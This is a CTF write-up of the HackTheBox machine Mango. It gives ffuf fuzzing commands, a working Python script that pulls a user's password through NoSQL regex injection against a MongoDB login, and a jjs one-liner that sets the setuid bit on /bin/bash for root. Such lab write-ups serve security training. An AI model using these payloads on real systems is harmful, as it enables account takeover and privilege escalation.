---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/laah9gT2UR4/0.jpg
layout: post
media_subpath: /assets/posts/2020-04-18-mango-hackthebox
tags:
- hackthebox
- jjs
- linux
- mongodb
- nosql
title: Mango @ HackTheBox
---

Mango is a 30-point linux machine on hackthebox that involves a NoSQL-Injection which allows to obtain user passwords from a mongo database. For root we find the tool jjs, which is owned by root and has the setuid bit set. This allows us to run custom java code as root.

{% youtube laah9gT2UR4 %}

## Notes

Fuzzing the webroot:

```
~/tools/ffuf/ffuf -w ~/tools/SecLists/Discovery/Web-Content/raft-large-files.txt -u http://staging-order.mango.htb/FUZZ -fc 403
~/tools/ffuf/ffuf -w ~/tools/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://staging-order.mango.htb/FUZZ -fc 403
~/tools/ffuf/ffuf -w ~/tools/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://staging-order.mango.htb/vendor/FUZZ -fc 403
```

Installed.json

```
http://staging-order.mango.htb/vendor/composer/installed.json
```

MongoDB data extraction:

```python
#!/usr/bin/env python3
import re
import requests
import string

chars = string.ascii_letters + string.digits + string.punctuation
password = ""
url = "http://staging-order.mango.htb/"
done = False

while not done:
    done = True
    for c in chars:
        data = {
            "username": "mango",
            "password[$regex]": f"^{re.escape(password+c)}.*$",
            "login": "login"
        }
        r = requests.post(url, data=data, allow_redirects=False)
        if r.status_code == 302:     
            done = False       
            password += c
            print(f"[+] Found {c}")
print(f"[+] Password: {password}")
```

Jjs:

```
Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
```